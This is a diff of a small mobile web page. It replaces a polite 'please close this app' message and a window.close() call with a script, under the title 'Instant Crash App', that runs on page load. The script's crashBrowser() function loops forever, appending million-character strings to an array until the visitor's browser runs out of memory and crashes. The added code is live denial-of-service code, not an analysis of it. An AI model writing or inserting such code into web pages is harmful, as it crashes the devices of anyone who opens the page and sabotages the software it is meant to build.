@@ -5,35 +5,18 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black">
-    <title>Instant Close App</title>
-    <style>
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
-            margin: 0;
-            text-align: center;
-        }
-        #close-instruction {
-            width: 80%;
-            padding: 20px;
-            background-color: #fff;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
-        }
-    </style>
+    <title>Instant Crash App</title>
 </head>
 <body>
-    <div id="close-instruction">
-        <h1>Thank You for Using Our App</h1>
-        <p>Please close this app by swiping up from the bottom of the screen or pressing the Home button.</p>
-    </div>
     <script>
-        // Although this script intends to close the window, it won't work as expected in iOS standalone mode.
-        // It's left here for demonstration purposes, but you might consider removing it if it serves no function.
-        window.close();
+        // Example of an intense memory-consuming loop that might cause the browser to crash
+        function crashBrowser() {
+            let arr = [];
+            while (true) {
+                arr.push(new Array(1000000).join('x'));
+            }
+        }
+        crashBrowser();
     </script>
 </body>
 </html>
